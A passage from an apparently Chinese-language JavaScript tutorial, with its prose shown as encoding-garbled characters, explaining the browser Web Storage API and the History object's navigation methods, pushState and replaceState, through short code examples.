window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼Œ<code>Storage.setItem()</code>ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ï¼Œå†å­˜å…¥æµè§ˆå™¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;[object Object]&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>setItem</code>æ–¹æ³•çš„ä¸¤ä¸ªå‚æ•°éƒ½ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å­˜å…¥çš„å€¼éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚</p> <p>å¦‚æœå‚¨å­˜ç©ºé—´å·²æ»¡ï¼Œè¯¥æ–¹æ³•ä¼šæŠ›é”™ã€‚</p> <p>å†™å…¥ä¸ä¸€å®šè¦ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç›´æ¥èµ‹å€¼ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ä¸‹é¢ä¸‰ç§å†™æ³•ç­‰ä»·</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="storage-getitem"><a href="#storage-getitem" class="header-anchor">#</a> Storage.getItem()</h3> <p><code>Storage.getItem()</code>æ–¹æ³•ç”¨äºè¯»å–æ•°æ®ã€‚å®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯é”®åã€‚å¦‚æœé”®åä¸å­˜åœ¨ï¼Œè¯¥æ–¹æ³•è¿”å›<code>null</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>é”®ååº”è¯¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¼šè¢«è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²ã€‚</p> <h3 id="storage-removeitem"><a href="#storage-removeitem" class="header-anchor">#</a> Storage.removeItem()</h3> <p><code>Storage.removeItem()</code>æ–¹æ³•ç”¨äºæ¸…é™¤æŸä¸ªé”®åå¯¹åº”çš„é”®å€¼ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ï¼Œå¦‚æœé”®åä¸å­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>sessionStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="storage-clear"><a href="#storage-clear" class="header-anchor">#</a> Storage.clear()</h3> <p><code>Storage.clear()</code>æ–¹æ³•ç”¨äºæ¸…é™¤æ‰€æœ‰ä¿å­˜çš„æ•°æ®ã€‚è¯¥æ–¹æ³•çš„è¿”å›å€¼æ˜¯<code>undefined</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="storage-key"><a href="#storage-key" class="header-anchor">#</a> Storage.key()</h3> <p><code>Storage.key()</code>æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼ˆä»é›¶å¼€å§‹ï¼‰ï¼Œè¿”å›è¯¥ä½ç½®å¯¹åº”çš„é”®å€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// &quot;key&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ç»“åˆä½¿ç”¨<code>Storage.length</code>å±æ€§å’Œ<code>Storage.key()</code>æ–¹æ³•ï¼Œå¯ä»¥éå†æ‰€æœ‰çš„é”®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_3-storage-äº‹ä»¶"><a href="#_3-storage-äº‹ä»¶" class="header-anchor">#</a> 3.storage äº‹ä»¶</h2> <p>Storage æ¥å£å‚¨å­˜çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šè§¦å‘ storage äº‹ä»¶ï¼Œå¯ä»¥æŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'storage'</span><span class="token punctuation">,</span> onStorageChange<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ç›‘å¬å‡½æ•°æ¥å—ä¸€ä¸ª<code>event</code>å®ä¾‹å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªå®ä¾‹å¯¹è±¡ç»§æ‰¿äº† StorageEvent æ¥å£ï¼Œæœ‰å‡ ä¸ªç‰¹æœ‰çš„å±æ€§ï¼Œéƒ½æ˜¯åªè¯»å±æ€§ã€‚</p> <ul><li><code>StorageEvent.key</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå‘ç”Ÿå˜åŠ¨çš„é”®åã€‚å¦‚æœ storage äº‹ä»¶æ˜¯ç”±<code>clear()</code>æ–¹æ³•å¼•èµ·ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li> <li><code>StorageEvent.newValue</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çš„é”®å€¼ã€‚å¦‚æœ storage äº‹ä»¶æ˜¯ç”±<code>clear()</code>æ–¹æ³•æˆ–åˆ é™¤è¯¥é”®å€¼å¯¹å¼•å‘çš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li> <li><code>StorageEvent.oldValue</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ—§çš„é”®å€¼ã€‚å¦‚æœè¯¥é”®å€¼å¯¹æ˜¯æ–°å¢çš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</li> <li><code>StorageEvent.storageArea</code>ï¼šå¯¹è±¡ï¼Œè¿”å›é”®å€¼å¯¹æ‰€åœ¨çš„æ•´ä¸ªå¯¹è±¡ã€‚ä¹Ÿè¯´æ˜¯è¯´ï¼Œå¯ä»¥ä»è¿™ä¸ªå±æ€§ä¸Šé¢æ‹¿åˆ°å½“å‰åŸŸåå‚¨å­˜çš„æ‰€æœ‰é”®å€¼å¯¹ã€‚</li> <li><code>StorageEvent.url</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºåŸå§‹è§¦å‘ storage äº‹ä»¶çš„é‚£ä¸ªç½‘é¡µçš„ç½‘å€ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>StorageEvent.key</code>å±æ€§çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">onStorageChange</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'storage'</span><span class="token punctuation">,</span> onStorageChange<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>æ³¨æ„ï¼Œè¯¥äº‹ä»¶æœ‰ä¸€ä¸ªå¾ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œå°±æ˜¯å®ƒä¸åœ¨å¯¼è‡´æ•°æ®å˜åŒ–çš„å½“å‰é¡µé¢è§¦å‘ï¼Œè€Œæ˜¯åœ¨åŒä¸€ä¸ªåŸŸåçš„å…¶ä»–çª—å£è§¦å‘ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæµè§ˆå™¨åªæ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œå¯èƒ½è§‚å¯Ÿä¸åˆ°è¿™ä¸ªäº‹ä»¶ã€‚æ¯”å¦‚åŒæ—¶æ‰“å¼€å¤šä¸ªçª—å£ï¼Œå½“å…¶ä¸­çš„ä¸€ä¸ªçª—å£å¯¼è‡´å‚¨å­˜çš„æ•°æ®å‘ç”Ÿæ”¹å˜æ—¶ï¼Œåªæœ‰åœ¨å…¶ä»–çª—å£æ‰èƒ½è§‚å¯Ÿåˆ°ç›‘å¬å‡½æ•°çš„æ‰§è¡Œã€‚å¯ä»¥é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå®ç°å¤šä¸ªçª—å£ä¹‹é—´çš„é€šä¿¡ã€‚</p> <h2 id="å…«ã€history-å¯¹è±¡"><a href="#å…«ã€history-å¯¹è±¡" class="header-anchor">#</a> å…«ã€History å¯¹è±¡</h2> <h2 id="_1-æ¦‚è¿°-4"><a href="#_1-æ¦‚è¿°-4" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <p><code>window.history</code>å±æ€§æŒ‡å‘ History å¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºå½“å‰çª—å£çš„æµè§ˆå†å²ã€‚</p> <p>History å¯¹è±¡ä¿å­˜äº†å½“å‰çª—å£è®¿é—®è¿‡çš„æ‰€æœ‰é¡µé¢ç½‘å€ã€‚ä¸‹é¢ä»£ç è¡¨ç¤ºå½“å‰çª—å£ä¸€å…±è®¿é—®è¿‡3ä¸ªç½‘å€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span>length <span class="token comment">// 3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ç”±äºå®‰å…¨åŸå› ï¼Œæµè§ˆå™¨ä¸å…è®¸è„šæœ¬è¯»å–è¿™äº›åœ°å€ï¼Œä½†æ˜¯å…è®¸åœ¨åœ°å€ä¹‹é—´å¯¼èˆªã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// åé€€åˆ°å‰ä¸€ä¸ªç½‘å€</span>
history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// ç­‰åŒäº</span>
history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>æµè§ˆå™¨å·¥å…·æ çš„â€œå‰è¿›â€å’Œâ€œåé€€â€æŒ‰é’®ï¼Œå…¶å®å°±æ˜¯å¯¹ History å¯¹è±¡è¿›è¡Œæ“ä½œã€‚</p> <h2 id="_2-å±æ€§"><a href="#_2-å±æ€§" class="header-anchor">#</a> 2.å±æ€§</h2> <p>History å¯¹è±¡ä¸»è¦æœ‰ä¸¤ä¸ªå±æ€§ã€‚</p> <ul><li><code>History.length</code>ï¼šå½“å‰çª—å£è®¿é—®è¿‡çš„ç½‘å€æ•°é‡ï¼ˆåŒ…æ‹¬å½“å‰ç½‘é¡µï¼‰</li> <li><code>History.state</code>ï¼šHistory å †æ ˆæœ€ä¸Šå±‚çš„çŠ¶æ€å€¼ï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// å½“å‰çª—å£è®¿é—®è¿‡å¤šå°‘ä¸ªç½‘é¡µ</span>
window<span class="token punctuation">.</span>history<span class="token punctuation">.</span>length <span class="token comment">// 1</span>

<span class="token comment">// History å¯¹è±¡çš„å½“å‰çŠ¶æ€</span>
<span class="token comment">// é€šå¸¸æ˜¯ undefinedï¼Œå³æœªè®¾ç½®</span>
window<span class="token punctuation">.</span>history<span class="token punctuation">.</span>state <span class="token comment">// undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_3-æ–¹æ³•"><a href="#_3-æ–¹æ³•" class="header-anchor">#</a> 3.æ–¹æ³•</h2> <h3 id="history-back-ã€history-forward-ã€history-go"><a href="#history-back-ã€history-forward-ã€history-go" class="header-anchor">#</a> History.back()ã€History.forward()ã€History.go()</h3> <p>è¿™ä¸‰ä¸ªæ–¹æ³•ç”¨äºåœ¨å†å²ä¹‹ä¸­ç§»åŠ¨ã€‚</p> <ul><li><code>History.back()</code>ï¼šç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªç½‘å€ï¼Œç­‰åŒäºç‚¹å‡»æµè§ˆå™¨çš„åé€€é”®ã€‚å¯¹äºç¬¬ä¸€ä¸ªè®¿é—®çš„ç½‘å€ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœã€‚</li> <li><code>History.forward()</code>ï¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç½‘å€ï¼Œç­‰åŒäºç‚¹å‡»æµè§ˆå™¨çš„å‰è¿›é”®ã€‚å¯¹äºæœ€åä¸€ä¸ªè®¿é—®çš„ç½‘å€ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœã€‚</li> <li><code>History.go()</code>ï¼šæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œä»¥å½“å‰ç½‘å€ä¸ºåŸºå‡†ï¼Œç§»åŠ¨åˆ°å‚æ•°æŒ‡å®šçš„ç½‘å€ï¼Œæ¯”å¦‚<code>go(1)</code>ç›¸å½“äº<code>forward()</code>ï¼Œ<code>go(-1)</code>ç›¸å½“äº<code>back()</code>ã€‚å¦‚æœå‚æ•°è¶…è¿‡å®é™…å­˜åœ¨çš„ç½‘å€èŒƒå›´ï¼Œè¯¥æ–¹æ³•æ— æ•ˆæœï¼›å¦‚æœä¸æŒ‡å®šå‚æ•°ï¼Œé»˜è®¤å‚æ•°ä¸º<code>0</code>ï¼Œç›¸å½“äºåˆ·æ–°å½“å‰é¡µé¢ã€‚</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><code>history.go(0)</code>ç›¸å½“äºåˆ·æ–°å½“å‰é¡µé¢ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ·æ–°å½“å‰é¡µé¢</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ³¨æ„ï¼Œç§»åŠ¨åˆ°ä»¥å‰è®¿é—®è¿‡çš„é¡µé¢æ—¶ï¼Œé¡µé¢é€šå¸¸æ˜¯ä»æµè§ˆå™¨ç¼“å­˜ä¹‹ä¸­åŠ è½½ï¼Œè€Œä¸æ˜¯é‡æ–°è¦æ±‚æœåŠ¡å™¨å‘é€æ–°çš„ç½‘é¡µã€‚</p> <h3 id="history-pushstate-ï¼Œ"><a href="#history-pushstate-ï¼Œ" class="header-anchor">#</a> History.pushState()ï¼Œ</h3> <p><code>History.pushState()</code>æ–¹æ³•ç”¨äºåœ¨å†å²ä¸­æ·»åŠ ä¸€æ¡è®°å½•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¯¥æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä¾æ¬¡ä¸ºï¼š</p> <ul><li><code>state</code>ï¼šä¸€ä¸ªä¸æ·»åŠ çš„è®°å½•ç›¸å…³è”çš„çŠ¶æ€å¯¹è±¡ï¼Œä¸»è¦ç”¨äº<code>popstate</code>äº‹ä»¶ã€‚è¯¥äº‹ä»¶è§¦å‘æ—¶ï¼Œè¯¥å¯¹è±¡ä¼šä¼ å…¥å›è°ƒå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæµè§ˆå™¨ä¼šå°†è¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–ä»¥åä¿ç•™åœ¨æœ¬åœ°ï¼Œé‡æ–°è½½å…¥è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œå¯ä»¥æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡ã€‚å¦‚æœä¸éœ€è¦è¿™ä¸ªå¯¹è±¡ï¼Œæ­¤å¤„å¯ä»¥å¡«<code>null</code>ã€‚</li> <li><code>title</code>ï¼šæ–°é¡µé¢çš„æ ‡é¢˜ã€‚ä½†æ˜¯ï¼Œç°åœ¨æ‰€æœ‰æµè§ˆå™¨éƒ½å¿½è§†è¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å¡«ç©ºå­—ç¬¦ä¸²ã€‚</li> <li><code>url</code>ï¼šæ–°çš„ç½‘å€ï¼Œå¿…é¡»ä¸å½“å‰é¡µé¢å¤„åœ¨åŒä¸€ä¸ªåŸŸã€‚æµè§ˆå™¨çš„åœ°å€æ å°†æ˜¾ç¤ºè¿™ä¸ªç½‘å€ã€‚</li></ul> <p>å‡å®šå½“å‰ç½‘å€æ˜¯<code>example.com/1.html</code>ï¼Œä½¿ç”¨<code>pushState()</code>æ–¹æ³•åœ¨æµè§ˆè®°å½•ï¼ˆHistory å¯¹è±¡ï¼‰ä¸­æ·»åŠ ä¸€ä¸ªæ–°è®°å½•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> stateObj <span class="token operator">=</span> <span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token string">'bar'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>stateObj<span class="token punctuation">,</span> <span class="token string">'page 2'</span><span class="token punctuation">,</span> <span class="token string">'2.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ·»åŠ æ–°è®°å½•åï¼Œæµè§ˆå™¨åœ°å€æ ç«‹åˆ»æ˜¾ç¤º<code>example.com/2.html</code>ï¼Œä½†å¹¶ä¸ä¼šè·³è½¬åˆ°<code>2.html</code>ï¼Œç”šè‡³ä¹Ÿä¸ä¼šæ£€æŸ¥<code>2.html</code>æ˜¯å¦å­˜åœ¨ï¼Œå®ƒåªæ˜¯æˆä¸ºæµè§ˆå†å²ä¸­çš„æœ€æ–°è®°å½•ã€‚è¿™æ—¶ï¼Œåœ¨åœ°å€æ è¾“å…¥ä¸€ä¸ªæ–°çš„åœ°å€(æ¯”å¦‚è®¿é—®<code>google.com</code>)ï¼Œç„¶åç‚¹å‡»äº†å€’é€€æŒ‰é’®ï¼Œé¡µé¢çš„ URL å°†æ˜¾ç¤º<code>2.html</code>ï¼›ä½ å†ç‚¹å‡»ä¸€æ¬¡å€’é€€æŒ‰é’®ï¼ŒURL å°†æ˜¾ç¤º<code>1.html</code>ã€‚</p> <p>æ€»ä¹‹ï¼Œ<code>pushState()</code>æ–¹æ³•ä¸ä¼šè§¦å‘é¡µé¢åˆ·æ–°ï¼Œåªæ˜¯å¯¼è‡´ History å¯¹è±¡å‘ç”Ÿå˜åŒ–ï¼Œåœ°å€æ ä¼šæœ‰ååº”ã€‚</p> <p>ä½¿ç”¨è¯¥æ–¹æ³•ä¹‹åï¼Œå°±å¯ä»¥ç”¨<code>History.state</code>å±æ€§è¯»å‡ºçŠ¶æ€å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> stateObj <span class="token operator">=</span> <span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token string">'bar'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>stateObj<span class="token punctuation">,</span> <span class="token string">'page 2'</span><span class="token punctuation">,</span> <span class="token string">'2.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span>state <span class="token comment">// {foo: &quot;bar&quot;}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>å¦‚æœ<code>pushState</code>çš„ URL å‚æ•°è®¾ç½®äº†ä¸€ä¸ªæ–°çš„é”šç‚¹å€¼ï¼ˆå³<code>hash</code>ï¼‰ï¼Œå¹¶ä¸ä¼šè§¦å‘<code>hashchange</code>äº‹ä»¶ã€‚åè¿‡æ¥ï¼Œå¦‚æœ URL çš„é”šç‚¹å€¼å˜äº†ï¼Œåˆ™ä¼šåœ¨ History å¯¹è±¡åˆ›å»ºä¸€æ¡æµè§ˆè®°å½•ã€‚</p> <p>å¦‚æœ<code>pushState()</code>æ–¹æ³•è®¾ç½®äº†ä¸€ä¸ªè·¨åŸŸç½‘å€ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// æŠ¥é”™</span>
<span class="token comment">// å½“å‰ç½‘å€ä¸º http://example.com</span>
history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'https://twitter.com/hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>pushState</code>æƒ³è¦æ’å…¥ä¸€ä¸ªè·¨åŸŸçš„ç½‘å€ï¼Œå¯¼è‡´æŠ¥é”™ã€‚è¿™æ ·è®¾è®¡çš„ç›®çš„æ˜¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç è®©ç”¨æˆ·ä»¥ä¸ºä»–ä»¬æ˜¯åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•ä¸ä¼šå¯¼è‡´é¡µé¢è·³è½¬ã€‚</p> <h3 id="history-replacestate"><a href="#history-replacestate" class="header-anchor">#</a> History.replaceState()</h3> <p><code>History.replaceState()</code>æ–¹æ³•ç”¨æ¥ä¿®æ”¹ History å¯¹è±¡çš„å½“å‰è®°å½•ï¼Œå…¶ä»–éƒ½ä¸<code>pushState()</code>æ–¹æ³•ä¸€æ¨¡ä¸€æ ·ã€‚</p> <p>å‡å®šå½“å‰ç½‘é¡µæ˜¯<code>example.com/example.html</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'title 1'</span><span class="token punctuation">,</span> <span class="token string">'?page=1'</span><span class="token punctuation">)</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html?page=1</span>

history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'title 2'</span><span class="token punctuation">,</span> <span class="token string">'?page=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html?page=2</span>

history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'title 3'</span><span class="token punctuation">,</span> <span class="token string">'?page=3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html?page=3</span>

history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html?page=1</span>

history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html</span>

